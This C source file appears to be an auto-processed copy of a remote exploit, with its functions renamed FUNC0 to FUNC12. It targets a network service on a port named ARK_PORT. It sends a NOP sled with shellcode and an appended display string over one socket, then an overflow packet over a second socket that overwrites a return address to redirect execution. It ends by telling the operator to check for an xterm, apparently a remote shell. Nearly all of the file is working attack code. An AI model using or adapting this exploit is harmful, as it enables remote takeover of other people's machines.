#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {unsigned int targret; unsigned int targsafe; int len; } ;

/* Variables and functions */
 int ARK_PORT ; 
 int DATA_LEN ; 
 int HEAD_LEN ; 
 int /*<<< orphan*/  NOP ; 
 int NOP_LEN ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC3 (char*,int) ; 
 scalar_t__ FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,int /*<<< orphan*/ ,int) ; 
 int FUNC7 (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,char*,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int FUNC10 (char*) ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int) ; 

int FUNC12(char *host, char *export, unsigned int tnum)
{

	char 		head[] 		= "\x00\x4d\x00\x03\x00\x01\xff\xff";
	char 		data[DATA_LEN];
	char		sc_req[NOP_LEN*2];
	char		*sc;
	unsigned int	retaddr;
	unsigned int	safe;
	int		datalen		= 0;
	int		port		= ARK_PORT;
	int		sock_overflow, sock_nops;
	int 		i;
	int		nullmap = 0;

	sock_overflow = sock_nops = 0;

	retaddr = targets[tnum].targret;
	safe = targets[tnum].targsafe;
	datalen = targets[tnum].len;

	
	sock_nops = FUNC3(host, port);

	if (sock_nops < 1)
		FUNC1(-1);
	FUNC2(stderr, "[*] Connected to %s:%d NOP+shellcode socket\n", host, port);

	sock_overflow = FUNC3(host, port);
	if (sock_overflow < 1)
			FUNC1(-1);
	FUNC2(stderr, "[*] Connected to %s:%d overflow socket\n", host, port);

	// build data section of overflow packet
	FUNC6(data, NOP, DATA_LEN);

	// copy in return address
	FUNC5(data+datalen - 8, (char *)&retaddr, 4);
	// we overwrite a pointer that must be a valid address
	FUNC5(data+datalen-4, (char *)&safe, 4); 

	datalen = FUNC7(datalen);
	FUNC5(head+6, (char *)&datalen, 2);

	// build invalid packet with nops+shellcode
	FUNC6(sc_req, NOP, NOP_LEN+1);
	sc = (char *)FUNC4(FUNC10(shellcode) + FUNC10(export) + 2);
	FUNC9(sc, "%s%s%s", shellcode, export, "K");
	if (FUNC10(sc) + NOP_LEN > NOP_LEN*2-1) 
	{
		FUNC2(stderr, "[!] display name too long\n");
		FUNC1(-1);
	}

	FUNC5(sc_req+NOP_LEN, sc, FUNC10(sc));

	// send invalid nop+shellcode packet
	FUNC2(stderr, "[*] Sending nops+shellcode\n");
	FUNC11(sock_nops, sc_req, NOP_LEN+FUNC10(sc)+1); 
	FUNC2(stderr, "[*] Done, sleeping\n");
	FUNC8(1);
	FUNC0(sock_nops);

	// send overflow, pointing EIP to above nops+sc
	FUNC11(sock_overflow, head, HEAD_LEN);	// 8 byte header
	datalen = FUNC7(datalen);
	FUNC2(stderr, "[*] Sending overflow\n");
	FUNC11(sock_overflow, data, datalen);	// small overflow packet
	FUNC2(stderr, "[*] Done, check for xterm\n");
	FUNC0(sock_overflow);

}